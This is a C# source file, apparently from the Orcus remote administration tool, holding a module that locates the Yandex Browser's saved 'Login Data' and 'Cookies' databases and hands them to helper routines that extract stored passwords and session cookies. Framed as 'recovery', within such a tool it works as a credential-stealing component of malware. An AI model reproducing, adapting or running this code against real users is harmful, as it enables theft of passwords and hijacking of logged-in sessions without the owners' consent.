﻿using System;
using System.Collections.Generic;
using System.IO;
using Orcus.Commands.Passwords.Utilities;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.Yandex
{
    internal class Yandex : IPasswordRecovery, ICookieRecovery
    {
        private const string ApplicationName = "Yandex";

        public IEnumerable<RecoveredCookie> GetCookies()
        {
            try
            {
                string datapath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, ApplicationName);
            }
            catch (Exception)
            {
                return new List<RecoveredCookie>();
            }
        }

        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            try
            {
                string datapath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, ApplicationName);
            }
            catch (Exception)
            {
                return new List<RecoveredPassword>();
            }
        }
    }
}